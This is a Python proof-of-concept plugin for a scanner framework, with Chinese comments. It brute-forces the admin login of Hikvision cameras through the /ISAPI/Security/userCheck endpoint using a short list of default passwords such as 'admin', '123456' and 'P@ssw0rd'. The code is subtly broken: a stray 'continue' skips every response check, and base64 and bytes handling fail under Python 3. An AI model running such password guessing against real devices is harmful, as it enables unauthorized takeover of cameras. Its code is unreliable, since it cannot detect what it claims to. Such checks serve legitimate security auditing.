# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request, urllib.error, urllib.parse
import base64


class Vuln(ABVuln):
    vuln_id = 'Hikvision_0007'  # 平台漏洞编号
    name = '海康威视摄像头弱口令'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.MISCONFIGURATION  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        攻击者可进入web控制台，进而接管控制设备。
    '''  # 漏洞描述
    ref = 'Unknown'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hikvision'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4f460a9d-2bd8-4cdb-b31f-046f77603bdc'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            error_i = 0
            flag_list = ['>true</']
            user_list = ['admin']
            PASSWORD_DIC = ['admin', '123456', 'root',
                            'password', 'P@ssw0rd', 'admin888']
            for user in user_list:
                for password in PASSWORD_DIC:
                    try:
                        timeout = 10
                        login_url = arg + '/ISAPI/Security/userCheck'
                        request = urllib.request.Request(login_url)
                        auth_str_temp = user + ':' + password
                        auth_str = base64.b64encode(auth_str_temp)
                        request.add_header(
                            'Authorization', 'Basic ' + auth_str)
                        res = urllib.request.urlopen(request, timeout=timeout)
                        res_code = res.code
                        res_html = res.read()
                    except urllib.error.HTTPError as e:
                        res_code = e.code
                        res_html = e.read()
                    except urllib.error.URLError as e:
                        error_i += 1
                        if error_i >= 3:
                            return
                    continue
                    if int(res_code) == 404 or int(res_code) == 403:
                        return
                    if int(res_code) == 401:
                        continue
                    for flag in flag_list:
                        if flag in res_html:
                            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                                target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
